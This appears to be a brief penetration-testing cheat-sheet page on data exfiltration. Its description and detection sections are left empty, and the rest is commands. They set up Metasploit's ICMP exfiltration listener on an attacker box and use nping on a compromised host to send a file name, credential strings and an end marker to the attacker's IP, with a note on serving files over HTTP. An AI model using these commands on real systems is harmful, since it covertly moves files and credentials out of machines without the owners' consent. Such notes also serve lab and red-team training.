# Exfiltration

## **Exploit Description:**



## Command Syntax
```

-[Using ICMP Exfil from Metasploit]-

use auxiliary/server/icmp_exfil
show options
set BPF_FILTER icmp and not src (source ip of atk box, ie 10.10.249.52)
(this way we exclude the attacker from the icmp echo)
set interface eth0 (or in our case, ens192)
run

now on the box you're intending to exfil from,

sudo nping --icmp -c 1 (machine we're sending data to, ie 10.10.249.52) --data-string ("filename" ie "BOFfile.txt")
sudo nping --icmp -c 1 (machine we're sending data to) --data-string "admin:password" (to add stuff to file)
sudo nping --icmp -c 1 (machine we're sending data to) --data-string "EOF" (finishes off exfil)

-[HTTP]-

python3 -m http.server
just browse to it



```

## Detection Techniques